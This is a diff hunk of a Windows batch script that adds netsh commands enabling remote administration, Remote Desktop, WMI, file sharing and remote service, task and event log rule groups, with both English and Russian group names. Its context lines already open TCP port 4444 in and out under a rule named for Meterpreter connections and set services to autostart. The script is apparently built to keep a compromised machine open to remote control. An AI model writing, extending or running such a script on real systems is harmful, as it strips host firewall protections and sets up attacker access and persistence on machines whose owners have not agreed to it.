@@ -38,6 +38,30 @@ rem 10. Adjust System Services for Autostart
 %SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="Allow meterpreter connections port 4444" protocol=tcp localport=4444 action=allow dir=in
 %SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="Allow meterpreter connections port 4444" protocol=tcp localport=4444 action=allow dir=out
 %SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="svchost.EXE Application" dir=in action=allow program="%windir%\system32\svchost.exe" enable=yes
+netsh advfirewall set currentprofile settings remotemanagement enable
+netsh advfirewall firewall set rule group="Remote Administration" new enable=yes
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
+netsh advfirewall firewall set rule group="Remote Service Management" new enable=yes
+netsh advfirewall firewall set rule group="Performance Logs and Alerts" new enable=yes 
+netsh advfirewall firewall set rule group="Remote Event Log Management" new enable=yes
+netsh advfirewall firewall set rule group="Remote Scheduled Tasks Management" new enable=yes
+netsh advfirewall firewall set rule group="Remote Volume Management" new enable=yes 
+netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+netsh advfirewall firewall set rule group="Windows Firewall Remote Management" new enable =yes
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
+
+netsh advfirewall firewall set rule group="Удаленное администрирование" new enable=Yes
+netsh advfirewall firewall set rule group="Служба веб-управления" new enable=Yes
+netsh advfirewall firewall set rule group="Служба входа в сеть" new enable=Yes
+netsh advfirewall firewall set rule group="Общий доступ к файлам и принтерам" new enable=yes
+netsh advfirewall firewall set rule group="Удаленное управление Windows" new enable=yes
+netsh advfirewall firewall set rule group="Журналы и оповещения производительности" new enable=yes 
+netsh advfirewall firewall set rule group="Удаленный мониторинг событий" new enable=yes
+netsh advfirewall firewall set rule group="Удаленное управление томами" new enable=yes
+netsh advfirewall firewall set rule group="Удаленное управление службой" new enable=yes 
+netsh advfirewall firewall set rule group="Удаленный рабочий стол" new enable=yes
+netsh advfirewall firewall set rule group="Удаленное управление брандмауэром Защитника Windows" new enable=yes
+netsh advfirewall firewall set rule group="Инструментарий управления Windows (wmi)" new enable=yes
 
 sc config SharedAccess start= auto
 sc config RpcSs start= auto
